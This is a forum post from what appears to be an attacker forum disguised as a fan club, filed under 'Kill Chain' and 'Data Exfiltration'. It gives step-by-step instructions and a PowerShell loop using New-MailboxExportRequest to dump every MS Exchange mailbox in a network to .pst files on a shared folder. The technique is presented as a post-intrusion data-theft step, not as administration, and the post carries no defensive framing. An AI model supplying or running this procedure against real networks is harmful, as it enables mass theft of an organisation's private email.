@@ -1,0 +1,56 @@
+    Vampir
+    New Topics
+    New replies
+
+    Start
+    Help
+    Search
+    Profile
+    Private Messages
+    Members
+
+Monica Bellucci Fan Club
+
+    Monica Bellucci Fan Club "
+    Kill Chain "
+    Data Exfiltration "
+    Backup all MS Exchange mailboxes to one team
+
+Backup all MS Exchange mailboxes to one command
+user5 - 1 - 13
+" previous topic next topic "
+
+Pages: 1
+user5
+
+    Users
+    Member
+    *
+        1
+        View Profile E-mail Personal Message (Offline)
+
+: May 20, 2021, 03:31:56 am
+Written by
+
+1) Find a server with free space >500gb (depending on number of boxes in the network)
+2) Create a new folder there for .pst files
+3) Share it with the Exchange Trusted Subsystem user
+4) Grant Read/Write permissions to that user
+5) Go to the IP address behind the Exchange server and start the Exchange management shell as Administrator
+6) Next the same command: foreach ($mbx in (Get-Mailbox)){New-MailboxExportRequest -mailbox $mbx.alias -FilePath "\\\Server\SharedFolder\$($mbx.alias).pst"}
+
+Pages: 1
+
+    Monica Bellucci Fan Club "
+    Kill Chain "
+    Data Exfiltration "
+    Backup all MS Exchange mailboxes to one team
+
+Go to:
+ 
++ Quick Reply
+
+    SMF 2.0.18 | SMF © 2020, Simple Machines
+    Developed with SychO
+
+
